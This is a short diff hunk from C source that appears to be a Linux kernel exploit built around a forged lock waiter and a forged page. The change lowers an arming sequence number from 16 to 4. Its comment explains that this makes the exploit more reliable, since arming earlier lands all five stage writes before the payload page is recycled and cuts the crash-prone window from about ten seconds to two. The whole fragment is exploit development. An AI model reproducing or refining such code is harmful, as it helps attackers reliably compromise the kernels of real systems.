@@ -271,7 +271,12 @@ void do_mcast_fake_lock_route(void) {
   uint64_t relink_left = fake_right ? pselect_custom_target : 0;
   uint64_t wake_prio = ((uint64_t)FAKE_WAITER_PRIO << 32) | 3;
 
-  int arm_seq = TCP_ARM_SEQ;
+  /* Arm earlier than the historical seq 16: the forged page only lives in a
+   * usable state for as long as the route keeps looping, and every crash we
+   * reproduced had the kernel walk a page whose payload had already been
+   * recycled. Seq 4 still lands all five stage writes and cuts the exposure
+   * window from ~10 s to ~2 s. */
+  int arm_seq = 4;
   int post_hold = TCP_POST_GETSOCKOPT_HOLD;
   int route_ok = 0;
 
